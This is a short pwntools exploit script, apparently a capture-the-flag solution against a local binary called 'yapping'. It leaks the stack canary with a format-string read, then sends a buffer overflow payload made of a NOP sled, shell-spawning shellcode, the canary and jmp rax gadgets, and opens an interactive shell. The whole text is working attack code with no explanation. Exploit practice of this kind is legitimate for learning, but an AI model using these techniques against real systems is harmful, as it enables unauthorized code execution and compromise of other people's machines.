from pwn import *
elf = context.binary = ELF("./yapping")
p = process()
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p, '''
        echo "hi"
        break main
        continue
        ''')  # Use tmux
buffer = 6
jmp_rax = 0x000000000040114c
p.sendline("%15$p")
p.recvuntil(b"oaoaoaoa")
canary = int(p.recvline().strip().decode(),16)
log.info(hex(canary))
p.sendline("exit")
payload = asm("nop") * 24 + asm(shellcraft.sh()) + p64(canary) + b"8" + p64(0x0000000000401016) + p64(jmp_rax)
p.sendline(payload)
print(len(payload))
write("payload",payload)
p.interactive()
